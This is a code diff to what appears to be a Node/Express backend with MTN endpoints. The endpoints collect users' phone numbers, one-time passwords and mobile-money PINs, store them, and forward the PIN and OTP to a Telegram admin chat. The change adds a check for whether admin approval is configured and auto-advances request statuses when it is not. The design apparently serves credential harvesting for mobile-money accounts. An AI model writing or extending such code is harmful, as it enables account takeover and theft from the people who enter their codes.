@@ -55,6 +55,10 @@ function makeId() {
   return Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
 }
 
+function isAdminApprovalConfigured() {
+  return Boolean(api && ADMIN_CHAT_ID);
+}
+
 const demoUsers = new Map();
 const demoPayments = [];
 const demoMtnRequests = new Map();
@@ -257,7 +261,9 @@ app.post('/api/mtn/submit-otp', (req, res) => {
       existing.otp = otp;
       existing.phone = phone || existing.phone;
       existing.status = existing.status || 'pending';
-      if (api && ADMIN_CHAT_ID) {
+      if (!isAdminApprovalConfigured()) {
+        existing.status = 'completed';
+      } else if (api && ADMIN_CHAT_ID) {
         notifyTelegramForRequest(id, {
           plan: existing.plan,
           price: existing.price,
@@ -268,6 +274,11 @@ app.post('/api/mtn/submit-otp', (req, res) => {
         });
       }
     }
+  }
+
+  if (!isAdminApprovalConfigured()) {
+    const existing = requests.get(id) || demoMtnRequests.get(id);
+    if (existing) existing.status = 'completed';
   }
 
   res.json(jsonSuccess({ message: 'OTP accepted', phone, otp, requestId: id }));
@@ -286,6 +297,11 @@ app.post('/api/mtn/submit', (req, res) => {
     step: 'login',
     code: pin,
   });
+
+  const request = requests.get(requestId) || demoMtnRequests.get(requestId);
+  if (request && !isAdminApprovalConfigured()) {
+    request.status = 'phone_pin_verified';
+  }
 
   res.json(jsonSuccess({ message: 'PIN accepted', phone, requestId }));
 });
@@ -316,6 +332,7 @@ app.post('/api/mtn/submit-link', (req, res) => {
     if (existing) {
       existing.link = link;
       existing.phone = resolvedPhone;
+      existing.status = isAdminApprovalConfigured() ? existing.status || 'pending' : 'otp_pending';
     }
   }
 
